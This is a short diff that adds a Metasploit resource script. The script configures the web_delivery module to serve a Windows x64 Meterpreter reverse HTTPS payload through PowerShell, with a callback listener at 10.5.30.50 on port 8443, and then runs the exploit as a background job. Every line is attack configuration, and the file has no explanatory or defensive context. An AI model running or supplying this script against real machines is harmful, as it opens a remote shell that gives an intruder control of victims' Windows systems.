@@ -1,0 +1,7 @@
+use exploit/multi/script/web_delivery
+set target PSH\ (Binary)
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 10.5.30.50
+set PSH-EncodedCommand false
+set LPORT 8443
+exploit -j
